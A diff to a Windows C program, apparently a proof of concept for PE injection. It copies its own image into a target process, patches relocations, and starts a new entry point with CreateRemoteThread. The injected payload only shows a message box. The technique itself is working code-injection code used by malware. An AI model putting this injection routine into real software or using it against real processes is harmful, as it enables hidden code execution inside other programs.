@@ -14,6 +14,13 @@ DWORD InjectionEntryPoint(LPVOID lpParameter) {
     return 0;
 }
 
+DWORD InjectionEntryPoint1(LPVOID lpParameter) {
+    CHAR moduleName[128] = "";
+    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
+    MessageBoxA(NULL, moduleName, "Obligatory PE Injection 1", MB_OK);
+    return 0;
+}
+
 // Function to get the PID of a process by its name
 DWORD get_pid_by_name(const char *proc_name) {
     PROCESSENTRY32 pe32;
@@ -70,6 +77,7 @@ void LaunchHiddenProcess(const char *processName) {
 
 int main() {
 
+    MessageBoxA(NULL, "Go to entry", "Hehe", MB_OK);
     PVOID imageBase = GetModuleHandle(NULL);
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
     PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
@@ -97,25 +105,29 @@ int main() {
     while (relocationTable->SizeOfBlock > 0) {
         DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
         PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
-        printf("Relo: %d\n", i);
+        printf("Relo Block: %d\n", i);
         i++;
-        for (DWORD i = 0; i < relocationEntriesCount; i++) {
-            if (relocationRVA[i].Offset) {
-                PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
+        for (DWORD j = 0; j < relocationEntriesCount; j++) {
+            if (relocationRVA[j].Offset) {
+                PDWORD_PTR originalAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[j].Offset);
+                PDWORD_PTR patchedAddress = originalAddress;
+                printf("Original Address: %p -> ", (void*)*patchedAddress);
                 *patchedAddress += deltaImageBase;
+                printf("Patched Address: %p\n", (void*)*patchedAddress);
             }
         }
         relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
     }
-    printf("End Relo!\n");
     if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
         VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
         CloseHandle(targetProcess);
         VirtualFree(localImage, 0, MEM_RELEASE);
         return 1;
     }
-    printf("%lu\n", (DWORD_PTR)InjectionEntryPoint - (DWORD_PTR)imageBase);
-    DWORD_PTR injectionEntryPointAddress = (DWORD_PTR)InjectionEntryPoint + deltaImageBase;
+
+    printf("%lx\n", (DWORD_PTR)InjectionEntryPoint - (DWORD_PTR)imageBase);
+    printf("%lx\n", (DWORD_PTR)InjectionEntryPoint1 - (DWORD_PTR)imageBase);
+    DWORD_PTR injectionEntryPointAddress = (DWORD_PTR)InjectionEntryPoint1 + deltaImageBase;
     HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
     if (remoteThread == NULL) {
         VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
@@ -127,10 +139,14 @@ int main() {
     WaitForSingleObject(remoteThread, INFINITE);
     //Sleep(5000);
 
+
     CloseHandle(remoteThread);
     VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
     CloseHandle(targetProcess);
     VirtualFree(localImage, 0, MEM_RELEASE);
 
+    while (1) {
+    // Do nothing, just loop infinitely
+    }
     return 0;
 }
